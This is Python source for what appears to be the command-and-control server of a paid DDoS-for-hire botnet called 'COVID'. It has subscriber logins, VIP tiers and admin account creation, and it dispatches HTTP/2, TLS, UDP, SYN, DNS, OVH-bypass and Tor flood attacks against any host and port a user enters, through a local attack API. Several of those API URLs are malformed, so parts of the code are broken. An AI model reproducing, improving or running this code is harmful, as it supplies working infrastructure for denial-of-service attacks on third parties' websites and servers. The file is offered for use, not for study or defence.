import socket
import threading
import sys
import time
import ipaddress
import colorama
from colorama import Fore, init
import requests
import csv
from datetime import datetime

ansi_clear = '\033[2J\033[H'

banner = f'''
                   {Fore.LIGHTWHITE_EX}ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴠɪᴅ ᴄɴᴄ | ᴛ.ᴍᴇ/ᴄᴏᴠɪᴅʙᴏᴛɴᴇᴛ{Fore.LIGHTWHITE_EX}

{Fore.RED}                      ██████╗ ██████╗ ██╗   ██╗██╗██████╗ {Fore.RED}
{Fore.RED}                     ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗{Fore.RED}
{Fore.RED}                     ██║     ██║   ██║██║   ██║██║██║  ██║{Fore.RED}
{Fore.RED}                     ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║{Fore.RED}
{Fore.RED}                     ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝{Fore.RED}
{Fore.RED}                      ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝ {Fore.RED}
'''

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def update_title(client, username):
    while 1:
        try:
            response = requests.get("http://121:5000/infoconc")
            data = response.json()
            concs = data.get('num_concs')
            send(client, f'\33]0; [] COVID | t.me/CovidBotnet | Concs: {concs}/3\a', False)
            time.sleep(0.5)
            send(client, f'\33]0; [B] COVID | t.me/CovidBotnet | Concs: {concs}/3\a', False)
            time.sleep(0.5)
            send(client, f'\33]0; [BO] COVID | t.me/CovidBotnet | Concs: {concs}/3\a', False)
            time.sleep(0.5)
            send(client, f'\33]0; [BOT] COVID | t.me/CovidBotnet | Concs: {concs}/3\a', False)
            response = requests.get("http://127.0.0.1:5000/infoconc")
            data = response.json()
            concs = data.get('num_concs')
            time.sleep(0.5)
            send(client, f'\33]0; [BOTN] COVID | t.me/CovidBotnet | Concs: {concs}/3\a', False)
            time.sleep(0.5)
            send(client, f'\33]0; [BOTNE] COVID | t.me/CovidBotnet | Concs: {concs}/3\a', False)
            time.sleep(0.5)
            send(client, f'\33]0; [BOTNET] COVID | t.me/CovidBotnet | Concs: {concs}/3\a', False)
            response = requests.get("http:/0.1:5000/infoconc")
            data = response.json()
            concs = data.get('num_concs')
            time.sleep(2)
        except:
            client.close()

def command_line(client, username):
    def error():
        send(client, 'All concs expired. Please wait.')
    def attack(method, host, time, port):
        response = requests.get("http://127:5000/infoconc")
        data = response.json()
        concs = data.get('num_concs')
        if concs == 3:
           error()
        else:
           send(client, ansi_clear, False)
           send(client, f'           ╔════════════════════\033[0;41m\033[1;37mSUCCESSFUL\033[0m════════════════════╗')
           send(client, f'           ║  USER >> {username}                              ')
           send(client, f'           ║  HOST >> {host}                                  ')
           send(client, f'           ║  TIME >> {time}                                  ')
           send(client, f'           ║  METHOD >> {method}                              ')
           send(client, f'           ║  PORT >> {port}                                  ')
           send(client, f'           ╚══════════════════════════════════════════════════╝')
           requests.get(f"http://127.00/attack?method={method}&host={host}&port={port}&time={time}&username={username}")
    def attackL4(method, host, time, port):
        response = requests.get("http://1000/infoconc")
        data = response.json()
        concs = data.get('num_concs')
        if concs == 3:
           error()
        else:
           send(client, ansi_clear, False)
           send(client, f'           ╔════════════════════\033[0;41m\033[1;37mSUCCESSFUL\033[0m════════════════════╗')
           send(client, f'           ║  USER >> {username}                              ')
           send(client, f'           ║  HOST >> {host}                                  ')
           send(client, f'           ║  TIME >> {time}                                  ')
           send(client, f'           ║  METHOD >> {method}                              ')
           send(client, f'           ║  PORT >> {port}                                  ')
           send(client, f'           ╚══════════════════════════════════════════════════╝')
           requests.get(f"http:/00/attackL4?method={method}&host={host}&port={port}&time={time}&username={username}")
    def check_user_time(username):
        time = None
        with open('logins.csv', 'r') as file:
             reader = csv.DictReader(file)
             for row in reader:
                 if row['username'] == username:
                    if 'c_time' in row:
                        time = int(row['c_time'])
        return time
    def check_admin(username):
        time = None
        with open('logins.csv', 'r') as file:
             reader = csv.DictReader(file)
             for row in reader:
                 if row['username'] == username:
                    if row['admin'] == '1':
                       checkadm = 1
                    else:
                       checkadm = 0
        return checkadm
    def check_vip(username):
        time = None
        with open('logins.csv', 'r') as file:
             reader = csv.DictReader(file)
             for row in reader:
                 if row['username'] == username:
                    if row['vip'] == '1':
                       checkvip = 1
                    else:
                       checkvip = 0
        return checkvip
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'\033[0;41m\033[1;37mCovid • {username}\033[0m ➤ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                send(client, ansi_clear, False)
                send(client, f'{Fore.RED}                       ██████╗ ██████╗ ██╗   ██╗██╗██████╗ {Fore.RED}')
                send(client, f'{Fore.RED}                      ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗{Fore.RED}')
                send(client, f'{Fore.RED}                      ██║     ██║   ██║██║   ██║██║██║  ██║{Fore.RED}')
                send(client, f'{Fore.RED}                      ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║{Fore.RED}')
                send(client, f'{Fore.RED}                      ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝{Fore.RED}')
                send(client, f'{Fore.RED}                       ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝ {Fore.RED}')
                send(client, f'                        *************\033[0;41m\033[1;37mHELP\033[0m*************')
                send(client, 'HELP: shows this menu!')
                send(client, 'Profile: show profile')
                send(client, 'METHODSL7: attack methods L7')
                send(client, 'METHODSL4: attack methods L4')
                send(client, 'CLEAR: clear screen')
                send(client, 'LOGOUT: disconnect of cnc')
                send(client, '')


            elif command == 'METHODSL7':
                send(client, ansi_clear, False)
                send(client, f'{Fore.RED}                       ██████╗ ██████╗ ██╗   ██╗██╗██████╗ {Fore.RED}')
                send(client, f'{Fore.RED}                      ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗{Fore.RED}')
                send(client, f'{Fore.RED}                      ██║     ██║   ██║██║   ██║██║██║  ██║{Fore.RED}')
                send(client, f'{Fore.RED}                      ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║{Fore.RED}')
                send(client, f'{Fore.RED}                      ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝{Fore.RED}')
                send(client, f'{Fore.RED}                       ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝ {Fore.RED}')
                send(client, f'                        *************\033[0;41m\033[1;37mMETHODS\033[0m*************')
                send(client, 'Not VIP:')
                send(client, '• !ʙʏᴘᴀss - HTTP/2 BYPASS FLOOD')
                send(client, '• !ᴛʟs - TLS FLOOD')
                send(client, '• !Fʟᴏᴏᴅ - HTTP/2 FLOOD')
                send(client, '• !ʀᴀᴡ - HTTP-RAW FLOOD')
                send(client, '• !ᴛʟsᴜᴀ - TLS FLOOD WITH MORE USERAGENTS AND MORE PROXIES')
                send(client, 'VIP METHODS:')
                send(client, '• !ʙʏᴘᴀssᴠ2 - HTTP/2 BYPASS FLOODV2')
                send(client, '• !Fʟᴏᴏᴅᴠ2 - HTTP/2 FLOOD V2 (MORE POWER)')
                send(client, '• !ᴛʟsᴠɪᴘ - VIP TLS FLOOD (MORE POWER)')
                send(client, '• !ᴛᴏʀ - TOR METHOD. FOR ATTACK .onion')
                send(client, '')


            elif command == 'METHODSL4':
                send(client, ansi_clear, False)
                send(client, f'{Fore.RED}                       ██████╗ ██████╗ ██╗   ██╗██╗██████╗ {Fore.RED}')
                send(client, f'{Fore.RED}                      ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗{Fore.RED}')
                send(client, f'{Fore.RED}                      ██║     ██║   ██║██║   ██║██║██║  ██║{Fore.RED}')
                send(client, f'{Fore.RED}                      ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║{Fore.RED}')
                send(client, f'{Fore.RED}                      ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝{Fore.RED}')
                send(client, f'{Fore.RED}                       ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝ {Fore.RED}')
                send(client, f'                        *************\033[0;41m\033[1;37mMETHODS\033[0m*************')
                send(client, 'Temproary 250 maxtime.')
                send(client, 'Not VIP:')
                send(client, '• !SSH - SSH METHOD ')
                send(client, '• !ᴜᴅᴘ - UDP ATTACK L4 ')
                send(client, 'VIP METHODS:')
                send(client, '• !ᴅɴs - DNS METHOD')
                send(client, '• !ᴏᴠʜ - Bypass OVH protect L4')
                send(client, '• !ᴜᴅᴘᴠ2 - updated UDP')
                send(client, '• !sʏɴ-ᴛᴄᴘ - SYN FLOOD FOR TCP')
                send(client, '')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'THX FOR USING | t.me/CovidBotnet')
                time.sleep(1)
                break

            elif command == 'PROFILE':
                vip = check_vip(username)
                user_time = check_user_time(username)
                if vip == 1:
                   send(client, f'>> Username = {username}\n>> VIP methods = True\n>> Max time = {user_time}')
                else:
                   send(client, f'>> Username = {username}\n>> VIP methods = False\n>> Max time = {user_time}')


            elif command == '!BYPASS':
                 if len(args) == 4:
                    method = "BYPASS"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    if time <= user_time:
                       attack(method, host, time, port)
                       with open("logsofattack.txt", "a") as f:
                            f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                    else:
                       send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!RAW':
                 if len(args) == 4:
                    method = "RAW"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    if time <= user_time:
                       attack(method, host, time, port)
                       with open("logsofattack.txt", "a") as f:
                            f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                    else:
                       send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!FLOOD':
                 if len(args) == 4:
                    method = "FLOOD"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    if time <= user_time:
                       attack(method, host, time, port)
                       with open("logsofattack.txt", "a") as f:
                            f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                    else:
                       send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!TLS':
                 if len(args) == 4:
                    method = "TLS"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    if time <= user_time:
                       attack(method, host, time, port)
                       with open("logsofattack.txt", "a") as f:
                            f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                    else:
                       send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!UDP':
                 if len(args) == 4:
                    method = "!RAW-PPS"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    if time <= user_time:
                       attack(method, host, time, port)
                       with open("logsofattack.txt", "a") as f:
                            f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                    else:
                       send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!SSH':
                 if len(args) == 4:
                    method = "!SSH"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    if time <= user_time:
                       attack(method, host, time, port)
                       with open("logsofattack.txt", "a") as f:
                            f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                    else:
                       send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!TLSUA':
                 if len(args) == 4:
                    method = "TLSUA"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    if time <= user_time:
                       attack(method, host, time, port)
                       with open("logsofattack.txt", "a") as f:
                            f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                    else:
                       send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!BYPASSV2':
                 if len(args) == 4:
                    method = "BYPASSV2"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attack(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
                      
            elif command == '!FLOODV2':
                 if len(args) == 4:
                    method = "FLOODV2"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attack(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
                      

            elif command == '!TLSVIP':
                 if len(args) == 4:
                    method = "TLSVIP"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attack(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')

            elif command == '!TOR':
                 if len(args) == 4:
                    method = "TOR"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attack(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nUsername >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')

            elif command == '!DNS':
                 if len(args) == 4:
                    method = "!DNS"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attackL4(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nL4 | Username >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!OVH':
                 if len(args) == 4:
                    method = "!OVH-TCP"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attackL4(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nL4 | Username >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!UDPV2':
                 if len(args) == 4:
                    method = "!UDPV2"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attackL4(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nL4 | Username >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
            elif command == '!SYN-TCP':
                 if len(args) == 4:
                    method = "!SYN-TCP"
                    host = args[1]
                    time = int(args[2])
                    port = int(args[3])
                    user_time = check_user_time(username)
                    vip = check_vip(username)
                    if vip == 1:
                       if time <= user_time:
                          attackL4(method, host, time, port)
                          with open("logsofattack.txt", "a") as f:
                               f.write(f"\nL4 | Username >> {username}, method >> {method}, host >> {host}, time >> {time}\n")
                       else:
                          send(client, f'\033[0;41m\033[1;37mSorry. . . Time error.\033[0m')
                    else:
                       send(client, f'\033[0;41m\033[1;37mU dont have VIP access\033[0m')
                 else:
                    send(client, f'Error args. {command} host time port')
                      
            elif command == 'ADMIN':
                 checkadmm = check_admin(username)
                 if checkadmm == 1:
                    send(client, ansi_clear, False)
                    send(client, f'{Fore.RED}                       ██████╗ ██████╗ ██╗   ██╗██╗██████╗ {Fore.RED}')
                    send(client, f'{Fore.RED}                      ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗{Fore.RED}')
                    send(client, f'{Fore.RED}                      ██║     ██║   ██║██║   ██║██║██║  ██║{Fore.RED}')
                    send(client, f'{Fore.RED}                      ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║{Fore.RED}')
                    send(client, f'{Fore.RED}                      ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝{Fore.RED}')
                    send(client, f'{Fore.RED}                       ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝ {Fore.RED}')
                    send(client, f'{Fore.RED}                       *************************************')
                    send(client, f'{Fore.RED}                       *                                   *')
                    send(client, f'{Fore.RED}                       *              ADMIN MENU           *')
                    send(client, f'{Fore.RED}                       *                                   *')
                    send(client, f'{Fore.RED}                       *************************************')
                    send(client, f"GIVESUB user pass date max_time admin vip")
                 else:
                    send(client, f"Sorry. U not admin")
            elif command == 'GIVESUB':
                 checkadmm = check_admin(username)
                 if checkadmm == 1:
                    if len(args) == 7:
                       user = args[1]
                       password = args[2]
                       date = args[3]
                       time = int(args[4])
                       admin = int(args[5])
                       vip = int(args[6])
                       send(client, f"SUCCESSFUL! GIVED!")
                       with open('logins.csv', mode='a', newline='') as file:
                           writer = csv.writer(file)
                           writer.writerow([user,password,date,time,admin,vip])
                    else:
                       send(client, f"GIVESUB user pass date max_time admin vip")
                 else:
                    send(client, f"Sorry. U not admin")
            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()


def handle_client(client, address):
    def find_login(username, password):
        today = datetime.today().strftime('%Y-%m-%d')
        with open('logins.csv', mode='r') as file:
            reader = csv.reader(file)
            for row in reader:
                if len(row) <= 6:
                    c_username, c_password, c_date, _, _, _ = row
                    if c_username.lower() == username.lower() and c_password == password and c_date >= today:
                        return True
        return False
    send(client, f'\33]0;[LOGIN]\a', False)

    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTWHITE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTWHITE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break

    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials or subscribe expired. Buy plan >> @tcpwr')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=(client, username)).start()

               
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
